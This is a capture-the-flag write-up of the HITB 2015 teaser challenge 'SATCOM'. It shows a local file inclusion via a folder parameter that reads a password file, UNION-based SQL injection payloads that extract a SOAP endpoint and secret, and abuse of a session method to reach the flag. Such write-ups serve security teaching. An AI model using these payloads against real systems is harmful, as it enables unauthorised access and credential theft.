Title: web1000 - SATCOM
Author: doskop
Date: 2015-03-31 7:18
Tags: CTF


## Introduction

> SATCOM

> Our division of foreign cyber affairs has been hard at work lately. While
> mapping out some obscure subnets (which we think belong to the intelligence
> agency that is investigating HEAVENWEB) we've come accross a Sattelite
> Communications Center. One of our employees managed to snag a copy of some
> source code before they further locked down the platform. Luckily the login
> frontend still seems to be reachable.

Download the source code: [frontend.tar.gz]({filename}/downloads/hitb-2015-teaser-ctf/frontend.tar.gz).

## Logging in

We're presented with the source code of the front end and a link to the login page of the SATCOM system.

The login page doesn't seem to be vulnerable to SQL injection, so we start looking at the source code of the front end. The login check is handled by the LoginController->handleLogin($form) function, which delegates it to a user facade, which delegates it to an authentication service, which looks up the users in a repository. That repository is stored in /etc/scc.passwd so let's find a local file inclusion vulnerability.

Looking at the inline stylesheet we see that the arrow for the login button is served using a media/view route and not from the static file directory.

The MediaController contains these lines:

    :::php
    <?php
    public  function viewAction($file)
    {
            $folder = isset($_GET['folder']) ? $_GET['folder'] . "/" : "../app/storefront/resources/";
    
            try {
                    $fp = $this->getResourceService()->getResourceHandle($folder . $file);
                    $this->view->setRenderLevel(View::LEVEL_NO_RENDER);
                    $this->response->setHeader("Content-Type", "image/png");
    
                    fpassthru($fp);
    
            } catch (\Exception $e) {
                    echo $e->getMessage();
            }
    }
    ?>

That should be trivial to exploit, just provide a folder and a file.

    $ curl http://satcom.info/media/view/scc.passwd?folder=/etc
    4100:uPN4jD:phenom:3:true
    9011:Lft3a7:denial:3:true
    3331:Zs6tzx:admin:9:false

Too bad, the admin is disabled. Let's log in using the denial account.

## Deeper down the rabbit hole

After poking around the SATCOM interface a bit, we notice we can't get the data for the transponder with SIC 14.55 and location HEAVENWEB because we only have clearance level 3 and we need level 9. Back to the source code.

Looking at the views that provide the transponder management pages, we see that it uses the TransponderControlServiceClient class to communicate with a SOAP backend (in external/service/TransponderControlServiceClient.php). It gets the endpoint and a secret from the database and uses that to authenticate against the backend.

While poking around, we noticed that the getTransponderBySic function, which is used by the activate transponder code, is vulnerable to SQL injection. Let's use that to fetch the backend endpoint and secret. We go to the activate page and try to activate the following transponder:

    ' UNION ALL SELECT 1,value,3,4,5,6,7,8,9,10,11 FROM config WHERE `key`='external.webservice.endpoint' --

The error message on the top of the form will read:

    Transponder "http://primary-private-srv.satcom.info/service.wsdl" already activated

Ok, so now we have the endpoint. Let's get the secret:

    ' UNION ALL SELECT 1,value,3,4,5,6,7,8,9,10,11 FROM config WHERE `key`='external.webservice.secret' --

The error will be:

    Transponder "f8bb883a642fe29ad2f70bbe4077459a" already activated

## Capture the flag!

We now have a SOAP backend endpoint and a secret. Let's use them. We'll use suds to connect to the backend, use the CreateSessionForUid method using the admin's UID to create a session and use the GetPacketData method to get the data we want.

    :::python
    $ python
    >>> from suds.client import Client
    >>> c = Client('http://primary-private-srv.satcom.info/service.wsdl')
    >>> c.service.CreateSessionForUid('f8bb883a642fe29ad2f70bbe4077459a', 3331)
    >>> c.service.GetPacketData('1.4.55')
    No handlers could be found for logger "suds.client"
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
      File "/Users/ingmar/Projects/wargames/lib/python2.7/site-packages/suds/client.py", line 542, in __call__
        return client.invoke(args, kwargs)
      File "/Users/ingmar/Projects/wargames/lib/python2.7/site-packages/suds/client.py", line 602, in invoke
        result = self.send(soapenv)
      File "/Users/ingmar/Projects/wargames/lib/python2.7/site-packages/suds/client.py", line 649, in send
        result = self.failed(binding, e)
      File "/Users/ingmar/Projects/wargames/lib/python2.7/site-packages/suds/client.py", line 702, in failed
        r, p = binding.get_fault(reply)
      File "/Users/ingmar/Projects/wargames/lib/python2.7/site-packages/suds/bindings/binding.py", line 265, in get_fault
        raise WebFault(p, faultroot)
    suds.WebFault: Server raised fault: 'You need clearance level 9 to view this data'

Not what we hoped for. Should've expected that though, the admin account was disabled after all. Let have a look at the WSDL to see what else we've got.

    :::xml
    <wsdl:portType name="TransponderControlServicePortType">
        <wsdl:operation name="CreateSessionForUid">
            <wsdl:input message="tns:CreateSessionForUidRequest"/>
            <wsdl:output message="tns:CreateSessionForUidResponse"/>
        </wsdl:operation>
        <wsdl:operation name="CreateSessionForClearanceLevel">
            <wsdl:input message="tns:CreateSessionForClearanceLevelRequest"/>
            <wsdl:output message="tns:CreateSessionForClearanceLevelResponse"/>
        </wsdl:operation>
        <wsdl:operation name="GetPacketData">
            <wsdl:input message="tns:GetPacketDataRequest"/>
            <wsdl:output message="tns:GetPacketDataResponse"/>
        </wsdl:operation>
        <wsdl:operation name="GetStatus">
            <wsdl:input message="tns:GetStatusRequest"/>
            <wsdl:output message="tns:GetStatusResponse"/>
        </wsdl:operation>
    </wsdl:portType>

CreateSessionForClearanceLevel looks promising. Let's try it.

    :::python
    $ python
    >>> from suds.client import Client
    >>> c = Client('http://primary-private-srv.satcom.info/service.wsdl')
    >>> c.service.CreateSessionForClearanceLevel('f8bb883a642fe29ad2f70bbe4077459a', 9)
    >>> c.service.GetPacketData('1.4.55')
    Great job!! :) Here's your flag: HITB{32c148293a4b6634c211284f2578bb35}
